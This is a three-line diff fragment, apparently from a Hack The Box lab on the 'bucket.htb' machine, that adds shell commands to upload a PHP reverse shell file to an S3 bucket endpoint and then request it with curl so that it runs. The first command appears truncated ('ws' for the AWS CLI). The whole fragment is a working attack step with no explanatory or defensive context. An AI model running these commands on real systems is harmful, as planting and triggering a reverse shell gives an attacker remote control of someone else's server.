@@ -1,0 +1,3 @@
+
+ws --endpoint-url http://s3.bucket.htb s3 cp revshell.php s3://adserver/revshell.php
+curl http://bucket.htb/revshell.php &> /dev/null
